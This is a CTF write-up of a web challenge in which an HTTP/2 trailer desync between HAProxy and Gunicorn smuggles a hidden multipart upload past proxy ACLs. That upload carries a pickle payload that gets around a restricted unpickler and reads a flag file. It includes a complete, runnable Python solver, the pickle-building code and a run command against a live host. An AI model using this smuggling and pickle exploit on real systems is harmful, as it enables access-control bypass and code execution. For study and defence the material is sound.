---
title: "re-strictions — HAProxy H2 Trailer Desync"
ctf: "CSCV2026 Finals"
date: 2026-10-18
category: web
difficulty: hard
points: "not present in the local challenge artifacts"
flag_format: "CSCV2026{...}"
author: "study notes"
---

# re-strictions — HAProxy H2 Trailer Desync

## Summary

The application is a Flask upload endpoint protected by HAProxy ACLs. External clients cannot send either an /office path or a multipart/form-data request.

The useful bug is an HTTP/2-to-HTTP/1 desynchronization in HAProxy 2.9.7: an HTTP/2 request can advertise an incomplete Content-Length and end with trailing HEADERS. HAProxy forwards that request to Gunicorn as an HTTP/1 request without checking the missing body. A later HTTP/2 stream then supplies bytes that Gunicorn interprets as a second, hidden HTTP/1 request.

The hidden request is a normal multipart upload. Its pickle payload recovers __import__ indirectly, reads /flag.txt, and reflects the flag through flask.abort(400, flag).

The flag was confirmed in the live target response:

```
CSCV2026{HapR0xY_6Un1CoRn_WeRkzeug_DisagRe3}
```

## What “desync” means here

The proxy and the application do not agree about where one HTTP request ends. That disagreement is the whole bug.

HAProxy receives HTTP/2 frames, checks them, and then writes an HTTP/1 request to Gunicorn. Normally this conversion is safe because both sides agree on the body length. In this challenge, a request that ends with trailing HTTP/2 headers bypasses a body-length check. HAProxy sends Gunicorn a request that claims to have a body even though no body was sent.

Gunicorn waits for those missing bytes. The headers of a later request become the bytes it was waiting for. The remaining data is then interpreted as a new HTTP/1 request—but HAProxy never applies its ACLs to that data because, from HAProxy's point of view, it is only the body of the earlier stream.

So the two components see different traffic:

```text
HAProxy:  an allowed request followed by an allowed request body
Gunicorn: an allowed request followed by a hidden multipart upload
```

This is why the exploit is not just “send a strange request.” It is a parser disagreement between two different HTTP implementations.

## Environment

The relevant versions were:

| Component | Version | Relevance |
|---|---:|---|
| HAProxy | 2.9.7 | H2 trailer Content-Length desynchronization |
| Gunicorn | 25.3.0 | Backend HTTP/1 parser and body draining |
| Flask | 3.1.3 | Upload route and error reflection |
| Werkzeug | 3.1.9 | Parses the hidden, normal multipart request |
| Client library | h2 4.4.1 | Sends HTTP/2 frames with ALPN h2 |

The supplied Compose file exposes HAProxy as plain TCP. The remote service is wrapped in TLS and negotiates HTTP/2, so a normal ncat --ssl session is not enough to exercise the H2 path; the solver must advertise ALPN h2.

## Solution

### Step 1: Map the ACLs and the backend sink

The public HAProxy configuration contains:

```haproxy
acl network_office src 192.168.17.0/24 10.0.17.0/24
acl is_office_path path,url_dec -i -m sub /office
acl is_multipart req.hdr(Content-Type) -i -m beg multipart/form-data

http-request deny if is_office_path !network_office
http-request deny if is_multipart !network_office
```

The backend route is:

```python
@app.route("/office/process", methods=["POST"])
def process():
    uploaded_file = request.files["file"]
    restricted_loads(uploaded_file.read())
    return "It works!", 200
```

The restricted unpickler only rejects direct references to builtins.exec, builtins.eval, and builtins.__import__. It still permits globals, getattr, open, and other builtins. Therefore the application sink is reachable if a multipart request can pass through HAProxy.

The qualifier-era vertical-tab trick was not sufficient here. A Content-Type beginning with 0x0b bypassed HAProxy, but Werkzeug 3.1.9 did not normalize it to multipart/form-data; Flask consequently saw no file field and returned a generic 400.

### Step 2: Desynchronize HAProxy and Gunicorn

The request path is:

```
HTTP/2 frames → HAProxy H2 decoder → HAProxy-generated HTTP/1 → Gunicorn
```

HAProxy validates the remaining body length when a stream ends on a DATA frame. In the affected trailer path, the equivalent check is missing. Conceptually, the missing check is:

```c
if ((*flags & H2_SF_DATA_CLEN) && *body_len != 0)
    goto fail;
```

First send stream 1:

```
HEADERS stream 1
  :method = GET
  :scheme = https
  :authority = x
  :path = /
  content-length = 49

HEADERS stream 1
  x-trailer = y
  END_STREAM
```

No DATA bytes are sent for stream 1. HAProxy nevertheless generates this backend request:

```http
GET / HTTP/1.1\r\n
host: x\r\n
content-length: 49\r\n
\r\n
```

Gunicorn can produce the response to GET /, but its HTTP/1 request state still expects to consume 49 body bytes before parsing the next request.

Now open stream 3 with safe headers only:

```
HEADERS stream 3
  :method = POST
  :scheme = https
  :authority = x
  :path = /
  content-length = 540
```

HAProxy serializes those headers as:

```http
POST / HTTP/1.1\r\n
host: x\r\n
content-length: 540\r\n
\r\n
```

This is exactly 49 bytes. Gunicorn consumes it as stream 1's missing body. The HTTP/2 stream 3 DATA is then forwarded by HAProxy as opaque body data for the safe POST / request, but Gunicorn parses the first bytes of that DATA as a new HTTP/1 request:

```http
POST /office/process HTTP/1.1\r\n
Host: x\r\n
Content-Type: multipart/form-data; boundary=----web03-boundary\r\n
Content-Length: 394\r\n
Connection: close\r\n
\r\n
...multipart body...
```

The important boundary distinction is:

```
HAProxy ACL view:  GET /  +  POST /
Gunicorn view:    GET /  +  POST /office/process with multipart body
```

HAProxy never re-runs its ACLs over the opaque DATA bytes, so /office/process and multipart/form-data are invisible to the proxy ACLs. Gunicorn receives a normal HTTP/1 multipart request, and Werkzeug parses it normally.

### Step 3: Escape the restricted pickle loader

The payload uses only allowed indirect lookups:

```
globals()                          → application globals dictionary
getattr(globals(), "get")          → dictionary get method
get("__builtins__")                 → builtins dictionary
getattr(builtins, "get")            → dictionary get method
get("__import__")                   → import function
__import__("flask")                 → Flask module
getattr(flask, "abort")             → abort function
open("/flag.txt").read()            → flag contents
abort(400, flag)                    → flag in the HTTP response
```

The following solver performs the entire chain. It creates the pickle and multipart body, sends the two-stream H2 desynchronization, collects the Flask 400 response, and prints the flag.

```python
#!/usr/bin/env python3
import argparse
import re
import socket
import ssl
import time

from h2.config import H2Configuration
from h2.connection import H2Connection
from h2.events import DataReceived, ResponseReceived, StreamEnded


FLAG_RE = re.compile(rb"CSCV2026\{[^}\r\n]+\}")


def global_ref(name: str) -> bytes:
    return b"c" + b"builtins\n" + name.encode("ascii") + b"\n"


def short_string(value: str) -> bytes:
    raw = value.encode("utf-8")
    if len(raw) > 255:
        raise ValueError("pickle string is too long")
    return b"\x8c" + bytes([len(raw)]) + raw


def build_pickle(flag_path: str) -> bytes:
    p = bytearray(b"\x80\x04")

    # globals() -> globals()['__builtins__'] -> builtins['__import__']
    p += global_ref("globals") + b")R\x94" + b"0"
    p += global_ref("getattr") + b"h\x00" + short_string("get") + b"\x86R\x94" + b"0"
    p += b"h\x01" + short_string("__builtins__") + b"\x85R\x94" + b"0"
    p += global_ref("getattr") + b"h\x02" + short_string("get") + b"\x86R\x94" + b"0"
    p += b"h\x03" + short_string("__import__") + b"\x85R\x94" + b"0"

    # Import Flask and call abort(400, open(flag_path).read()).
    p += b"h\x04" + short_string("flask") + b"\x85R\x94" + b"0"
    p += global_ref("getattr") + b"h\x05" + short_string("abort") + b"\x86R\x94" + b"0"
    p += global_ref("open") + short_string(flag_path) + b"\x85R\x94" + b"0"
    p += global_ref("getattr") + b"h\x07" + short_string("read") + b"\x86R\x94" + b"0"
    p += b"h\x08)R\x94" + b"0"
    p += b"h\x06(M\x90\x01h\x09tR."
    return bytes(p)


def build_multipart(payload: bytes) -> tuple[bytes, bytes]:
    boundary = b"----web03-boundary"
    body = (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="file"; filename="p.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
        + payload
        + b"\r\n--" + boundary + b"--\r\n"
    )
    return body, boundary


def receive_h2(sock, conn, seconds: float, stop_stream: int | None = None) -> bytes:
    output = bytearray()
    ended = set()
    deadline = time.monotonic() + seconds

    while time.monotonic() < deadline:
        sock.settimeout(max(0.05, deadline - time.monotonic()))
        try:
            data = sock.recv(65535)
        except socket.timeout:
            break
        if not data:
            break

        for event in conn.receive_data(data):
            if isinstance(event, ResponseReceived):
                print("stream", event.stream_id, "response", event.headers)
            elif isinstance(event, DataReceived):
                output.extend(event.data)
                conn.acknowledge_received_data(len(event.data), event.stream_id)
            elif isinstance(event, StreamEnded):
                ended.add(event.stream_id)

        pending = conn.data_to_send()
        if pending:
            sock.sendall(pending)
        if stop_stream is not None and stop_stream in ended:
            break

    return bytes(output)


def solve(host: str, port: int, timeout: float, flag_path: str, insecure: bool) -> str:
    pickle_payload = build_pickle(flag_path)
    multipart_body, boundary = build_multipart(pickle_payload)

    inner = (
        b"POST /office/process HTTP/1.1\r\n"
        b"Host: x\r\n"
        b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
        + b"Content-Length: " + str(len(multipart_body)).encode() + b"\r\n"
        b"Connection: close\r\n\r\n"
        + multipart_body
    )

    # This exact H1 serialization is consumed as stream 1's missing body.
    safe_h1 = (
        b"POST / HTTP/1.1\r\n"
        b"host: x\r\n"
        b"content-length: " + str(len(inner)).encode() + b"\r\n\r\n"
    )
    assert len(safe_h1) == 49, (len(safe_h1), safe_h1)

    print("pickle bytes:", len(pickle_payload))
    print("multipart bytes:", len(multipart_body))
    print("inner request bytes:", len(inner))
    print("safe H1 bytes:", len(safe_h1))

    context = ssl.create_default_context()
    if insecure:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    context.set_alpn_protocols(["h2"])

    with socket.create_connection((host, port), timeout=timeout) as raw:
        with context.wrap_socket(raw, server_hostname=host) as sock:
            if sock.selected_alpn_protocol() != "h2":
                raise RuntimeError("target did not negotiate HTTP/2")

            conn = H2Connection(
                config=H2Configuration(client_side=True, header_encoding="utf-8")
            )
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())

            # Stream 1: incomplete body, but END_STREAM arrives in trailers.
            conn.send_headers(
                1,
                [
                    (":method", "GET"),
                    (":scheme", "https"),
                    (":authority", "x"),
                    (":path", "/"),
                    ("content-length", "49"),
                ],
                end_stream=False,
            )
            conn.send_headers(1, [("x-trailer", "y")], end_stream=True)
            sock.sendall(conn.data_to_send())

            # Let HAProxy forward stream 1 and let Gunicorn enter body drain.
            receive_h2(sock, conn, 1.5)

            # Stream 3 is ACL-safe; its DATA becomes the hidden H1 request.
            conn.send_headers(
                3,
                [
                    (":method", "POST"),
                    (":scheme", "https"),
                    (":authority", "x"),
                    (":path", "/"),
                    ("content-length", str(len(inner))),
                ],
                end_stream=False,
            )
            sock.sendall(conn.data_to_send())
            time.sleep(0.25)

            conn.send_data(3, inner, end_stream=True)
            sock.sendall(conn.data_to_send())

            response_body = receive_h2(sock, conn, timeout, stop_stream=3)

    match = FLAG_RE.search(response_body)
    if not match:
        raise RuntimeError("flag not found in H2 response")
    return match.group().decode()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=1337)
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--flag-path", default="/flag.txt")
    parser.add_argument("--insecure", action="store_true")
    args = parser.parse_args()
    print("FLAG:", solve(args.host, args.port, args.timeout, args.flag_path, args.insecure))


if __name__ == "__main__":
    main()
```

Run it with an HTTP/2-capable Python environment:

```bash
python3 -m pip install h2
python3 solve.py \
  --host web03-fb422ed3e6ca.59.153.245.193.sslip.io \
  --port 1337 \
  --insecure
```

The important output is a normal response from stream 3 with status 400 and the flag in its body. The 400 is intentional: the pickle calls abort(400, flag) after reading the file.

## Why the qualifier writeup did not transfer

The qualifier challenge, Inoffice, used the same general idea but a different parser condition:

```
qualifier route: /office-process
finals route:    /office/process
```

The qualifier solution used an opaque HTTP/1 target plus a leading vertical tab in Content-Type. In the finals environment, Werkzeug was 3.1.9 and only stripped spaces and tabs from the media type. The VT bypass therefore produced this sequence:

```
HAProxy:  ACL bypassed
Werkzeug: media type is not multipart/form-data
Flask:    request.files['file'] is missing → generic 400
```

The final challenge required a different boundary: not a malformed header value, but a mismatch between HAProxy's HTTP/2 stream accounting and Gunicorn's HTTP/1 request accounting. Werkzeug then saw a completely normal inner multipart request.

## Lessons

1. A proxy bypass is only useful if the next parser accepts the same bytes. A 403-to-400 transition proved that HAProxy was bypassed, but not that the application reached the upload sink.
2. Model every protocol boundary separately. Here there were three relevant views: H2 stream state, HAProxy's generated H1 request, and Gunicorn's H1 request queue.
3. When a request claims a body length, calculate the exact bytes needed to move the backend parser's cursor. The 49-byte safe header is the bridge between the two requests.
4. Test ALPN and HTTP/2 explicitly. A TLS client that defaults to HTTP/1 can make an H2 vulnerability appear unreachable.
5. Pin transitive dependencies. The qualifier technique depended on Werkzeug whitespace behavior, but Werkzeug was not pinned in the challenge requirements.

## Flag

```
CSCV2026{HapR0xY_6Un1CoRn_WeRkzeug_DisagRe3}
```

Flag provenance: REMOTE_CONFIRMED — the exact flag appeared in the live target's stream 3 response body.

